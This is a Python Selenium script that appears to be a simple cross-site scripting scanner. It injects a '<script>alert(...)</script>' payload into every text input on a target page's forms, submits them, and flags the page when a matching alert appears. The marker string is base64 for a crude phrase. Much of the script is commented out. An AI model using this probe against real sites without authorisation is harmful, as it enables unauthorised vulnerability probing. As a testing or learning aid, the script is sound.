from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.alert import Alert
import pandas as pd

main_injection = '<script>alert("bGljayBteSBiYWxscw")</script>'
Array_of_results = []
site = None
primal_site = None
slave_site = None


def prnt_info(title, file_way):
    print("[  ?  ] Link of site: " + file_way)
    print("[  ?  ] Title of site: " + title)

def form_parser():
    #try:
        Array_of_form_tmp = site.find_elements_by_xpath("//form")
        if len(Array_of_form_tmp) == 0:
            print("[  -  ] There is no way to inject.")
            return 0

        Array_of_form = []
        for form in Array_of_form_tmp:
            if form.find_elements_by_xpath('.//input[@type="text"]'):
                Array_of_form.append(form)

        print("[  ?  ] There is " + str(len(Array_of_form)) + " potential ways to attack.")

        return Array_of_form
    #except:
        #print("[  -  ] Something wrong with quick test. \n")

def prepare_slaves_and_primals(file_way):
    global primal_site
    global slave_site
    primal_site = site.window_handles[0]
    site.execute_script("window.open('" + file_way + "');")
    slave_site = site.window_handles[1]
    site.switch_to.window(primal_site)

def refresh_slave(file_way):
    global slave_site
    site.switch_to.window(slave_site)
    site.close()
    site.switch_to.window(primal_site)
    site.execute_script("window.open('" + file_way + "');")
    slave_site = site.window_handles[1]


def prepare(file_way):
    global site
    file_way_g = file_way
    options = Options()
    options.headless = True
    site = webdriver.Firefox(options=options)
    #site = webdriver.Firefox()
    site.get(file_way)

    return site

def began_test(file_way, Array_of_form):
    count = 0
    for form in Array_of_form:
        count +=1
        load_injection(count)
        refresh_slave(file_way)
    return 0


def load_injection(count):
    site.switch_to.window(slave_site)
    Array_of_form = form_parser()
    local_count = 0
    for form in Array_of_form:
        local_count +=1
        if local_count == count:
            Array_of_inputs = form.find_elements_by_xpath('.//input[@type="text"]')
            for inpt in Array_of_inputs:
                inpt.send_keys(main_injection)
            form.find_element_by_xpath('.//input[@type="button"]').click()
            if check_alerts():
                print("Very important information!!!!")
            break


#def find_buttons():
    #try:
        #Array_of_butt = site.find_elements_by_xpath('//input[@type="button"]')
        #if len(Array_of_butt) == 0:
            #print("[  -  ] There is no way to upload injection.")
            #return 0
        #else:
            #print("[  ?  ] There is " + str(len(Array_of_butt)) + " potentian ways to upload injection.\n")
            #return Array_of_butt

    #except:
        #print("[  -  ] Something wrong with buttons of this website. \n")


def check_alerts():
    alert = Alert(site)
    if alert.text == "bGljayBteSBiYWxscw":
        print("[  !  ] Found the vulnerability !")
        alert.accept()
        return 1
    else:
        return 0


def main_test(file_way):
    #try:
        site = prepare(file_way)
        site.implicitly_wait(10)
        prnt_info(site.title, file_way)
        Array_of_form = form_parser()
        prepare_slaves_and_primals(file_way)
        result = began_test(file_way, Array_of_form)

        #if result == 0:
            #raise Exception()

    #except:
        #print("[  -  ] Everything is ruined. This is what you wanted? \n")
    #el = site.find_element_by_xpath('//input[@type="text"]')
    #el.send_keys('<script>alert("bGljayBteSBiYWxscw")</script>')
    #button = site.find_element_by_xpath('//input[@type="button"]')
    #button.click()
    #alert = Alert(site)
    #try:
        #if alert.text == "bGljayBteSBiYWxscw":
            #print("There is some dirty stuff!")
            #alert.accept()
    #except:
        #print("No alert")

